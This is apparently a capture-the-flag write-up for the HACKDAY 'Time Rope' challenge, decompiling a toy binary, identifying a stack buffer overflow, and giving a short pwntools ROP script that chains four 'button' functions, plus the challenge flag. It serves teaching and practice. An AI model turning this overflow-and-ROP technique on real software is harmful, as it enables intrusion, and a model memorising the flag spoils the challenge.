# Time Rope - CTF Writeup

## Challenge Information
- **Name:** Time Rope
- **Points:** 100
- **Difficulty:** Easy
- **Category:** Reverse Engineering / Binary Exploitation

## Description
> During one of your time travel in the 90's, you encounter a weird machine with a friend. After a bit of time you found out, labbergasted, that it is possibly the first working time machine ever invented.
>
> A password is blocking you to access the machine but luckily he managed to extract a binary file out of this relic.
>
> Your friend tells you to find a way to crack the password protection to unlock the machine and try to go back home to spread the news.

## Initial Analysis

Using Ghidra (via Arael), we analyze the binary:

```
Format: ELF x86_64
Architecture: x86_64 (64-bit, little-endian)
Entry Point: 0x400000
Not packed (entropy: 2.87)
```

## Code Analysis

### Main Function (0x40142e)

```c
int main(int argc, char **argv) {
    setvbuf(stdout, NULL, 2, 0);
    setvbuf(stdin, NULL, 2, 0);
    code_panel();
    return 0;
}
```

Simply initializes buffering and calls `code_panel()`.

### code_panel Function (0x4013eb)

```c
void code_panel(void) {
    char buffer[64];

    puts("--- Enter the code ---");
    read(0, buffer, 0x200);  // VULNERABILITY: reads 512 bytes into 64-byte buffer
    puts("Error - The code cannot be read manualy.");
    return;
}
```

**Vulnerability identified:** Classic buffer overflow - reads 0x200 (512) bytes into a 64-byte buffer, allowing us to overwrite the return address.

### Global Variables (0x404030 - 0x404044)

Hexdump of `.data` section reveals five 4-byte integers, all initialized to `1`:

```
00404030  01 00 00 00 01 00 00 00  01 00 00 00 01 00 00 00
00404040  01 00 00 00
```

These correspond to:
- `first_number` = 1
- `second_number` = 1
- `third_number` = 1
- `fourth_number` = 1
- `code_number` = 1

### Button Functions

The binary contains 9 button functions. Analyzing each reveals two categories:

#### Correct Path Buttons (require conditions)

| Function | Address | Condition | Output | Side Effect |
|----------|---------|-----------|--------|-------------|
| `button_1` | 0x40139f | `first_number==1 && code_number==1` | `"tH3_"` | `first_number=0` |
| `button_9` | 0x4011ea | `second_number==1 && code_number==1` | `"R31iC_"` | `second_number=0` |
| `button_4` | 0x401301 | `third_number==1 && code_number==1` | `"t1m3_"` | `third_number=0` |
| `button_5` | 0x4012b1 | `fourth_number==1 && code_number==1` | `"M4c81n3"` | `fourth_number=0`, calls `source_control()` |

#### Decoy Buttons (reset code_number)

| Function | Address | Output | Side Effect |
|----------|---------|--------|-------------|
| `button_2` | 0x401376 | `"Q74nt7m"` | `code_number=0` |
| `button_3` | 0x40134d | `"C7b3rn0"` | `code_number=0` |
| `button_6` | 0x401288 | `"M4tr1x2_"` | `code_number=0` |
| `button_7` | 0x40125f | `"_Sp3ctr3"` | `code_number=0` |
| `button_8` | 0x401236 | `"V0rt3x9_"` | `code_number=0` |

### source_control Function (0x401196)

```c
void source_control(void) {
    if (first_number == 0 && second_number == 0 &&
        third_number == 0 && fourth_number == 0) {
        puts("\nWelcome to the machine");
    } else {
        puts("\nWrong code.");
    }
    return;
}
```

Validates that all numbers are 0 (meaning correct sequence was executed).

## Solution

### Understanding the ROP Chain

The challenge name "rop_time" hints at **Return-Oriented Programming**. We need to:

1. Exploit the buffer overflow in `code_panel()`
2. Chain the correct button functions via return addresses
3. Execute them in the proper order to print the flag

### Correct Execution Order

Since each button checks `code_number==1` (which stays 1 if we use correct buttons) and its respective number variable, the sequence must be:

```
button_1 -> button_9 -> button_4 -> button_5
```

This produces:
```
tH3_ + R31iC_ + t1m3_ + M4c81n3
```

### Why This Order Works

1. All variables start at 1
2. `button_1`: Checks `first_number==1 && code_number==1` -> prints `"tH3_"`, sets `first_number=0`
3. `button_9`: Checks `second_number==1 && code_number==1` -> prints `"R31iC_"`, sets `second_number=0`
4. `button_4`: Checks `third_number==1 && code_number==1` -> prints `"t1m3_"`, sets `third_number=0`
5. `button_5`: Checks `fourth_number==1 && code_number==1` -> prints `"M4c81n3"`, sets `fourth_number=0`, calls `source_control()`
6. `source_control()`: All numbers are 0 -> prints "Welcome to the machine"

### Exploit (if needed for runtime)

```python
from pwn import *

# Function addresses
button_1 = 0x40139f
button_9 = 0x4011ea
button_4 = 0x401301
button_5 = 0x4012b1

# Buffer is 64 bytes + 8 bytes saved RBP = 72 bytes to return address
payload = b'A' * 72
payload += p64(button_1)
payload += p64(button_9)
payload += p64(button_4)
payload += p64(button_5)

p = process('./rop_time')
p.sendline(payload)
p.interactive()
```

## Flag

```
HACKDAY{tH3_R31iC_t1m3_M4c81n3}
```

## Key Takeaways

1. **Static analysis** can often reveal flags without needing to exploit the binary
2. **Function naming** (button_1 through button_9) and **string analysis** quickly reveal the solution
3. **Global variable initialization** in the `.data` section shows the expected program state
4. **Decoy functions** (buttons 2, 3, 6, 7, 8) exist to mislead - they reset `code_number` breaking the chain
